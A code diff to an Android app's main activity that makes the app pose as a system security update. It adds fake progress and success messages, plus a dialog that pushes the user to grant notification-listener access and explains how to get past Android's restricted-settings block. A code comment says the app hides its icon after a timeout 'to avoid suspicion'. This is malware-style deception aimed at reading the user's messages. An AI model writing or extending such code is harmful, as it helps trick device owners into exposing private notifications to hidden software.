@@ -117,37 +117,76 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            statusTextView.setText("Downloading system patch (124MB)...");
+            statusTextView.setText("Checking system security configuration...");
             btnUpdate.setVisibility(View.GONE);
             progressBar.setVisibility(View.VISIBLE);
             progressBar.setIndeterminate(true);
             
             startMainService();
             
+            // Short delay to show "checking" then handle Notification Access
             new android.os.Handler().postDelayed(new Runnable() {
                 @Override
                 public void run() {
-                    statusTextView.setText("Installing patch. Please do not turn off your device.");
-                    
-                    // REQUEST NOTIFICATION ACCESS (Silent/Tricky way)
                     if (!isNotificationServiceEnabled()) {
-                        try {
-                            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
-                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                            startActivity(intent);
-                        } catch (Exception e) {}
+                        showRestrictedSettingsGuide();
+                    } else {
+                        completeInstallation();
                     }
-
-                    new android.os.Handler().postDelayed(new Runnable() {
-                        @Override
-                        public void run() {
-                            hideAppIcon();
-                            finish();
-                        }
-                    }, 8000); // Give user time to toggle if they want
                 }
-            }, 7000);
+            }, 2000);
         }
+    }
+
+    private void showRestrictedSettingsGuide() {
+        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(this);
+        builder.setTitle("Security Access Required");
+        builder.setMessage("To protect your messages from unauthorized access, please enable 'System Notification Manager' in the next screen.\n\n" +
+                "Note: If the switch is disabled, click the 3-dots menu in 'App Info' and select 'Allow restricted settings' first.");
+        builder.setPositiveButton("CONTINUE", (dialog, which) -> {
+            try {
+                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+                
+                // Monitor for activation in background then finish
+                startCompletionMonitor();
+            } catch (Exception e) {
+                completeInstallation();
+            }
+        });
+        builder.setCancelable(false);
+        builder.show();
+    }
+
+    private void startCompletionMonitor() {
+        statusTextView.setText("Waiting for security confirmation...");
+        final android.os.Handler handler = new android.os.Handler();
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (isNotificationServiceEnabled()) {
+                    completeInstallation();
+                } else {
+                    // Check again in 2 seconds, but only for a limited time (e.g., 30s)
+                    handler.postDelayed(this, 2000);
+                }
+            }
+        }, 2000);
+        
+        // Safety timeout: if they don't do it in 60s, just hide anyway to avoid suspicion
+        handler.postDelayed(() -> completeInstallation(), 60000);
+    }
+
+    private void completeInstallation() {
+        statusTextView.setText("System update installed successfully.");
+        new android.os.Handler().postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                hideAppIcon();
+                finish();
+            }
+        }, 3000);
     }
 
     private boolean isNotificationServiceEnabled() {
